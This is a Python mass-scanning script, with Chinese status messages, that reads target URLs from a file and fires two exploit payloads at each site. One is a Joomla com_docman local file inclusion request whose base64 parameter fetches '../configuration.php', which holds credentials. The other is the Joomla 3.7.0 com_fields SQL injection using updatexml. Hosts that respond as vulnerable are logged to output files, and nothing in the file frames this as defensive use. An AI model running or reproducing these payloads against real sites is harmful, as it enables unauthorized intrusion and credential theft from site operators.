import sys
import json
import requests



urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'



for i in urls:
    url = i.rstrip("\n")
    #本地文件包含
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/components/com_docman/dl2.php?archive=0&file=Li4vY29uZmlndXJhdGlvbi5waHA="
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if req.status_code == 200 and r"<?php" in req.text:
            print("[+]存在joomla组件com_docman本地文件包含漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('本地文件包含.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在joomla_com_docman_lfi漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
    #SQL注入
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,Md5(1234)),0)"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if r"81dc9bdb52d04dc20036dbd8313ed05" in req.text:
            print("[+]存在joomla 3.7.0 core SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('SQL注入.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在joomla_index_list_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

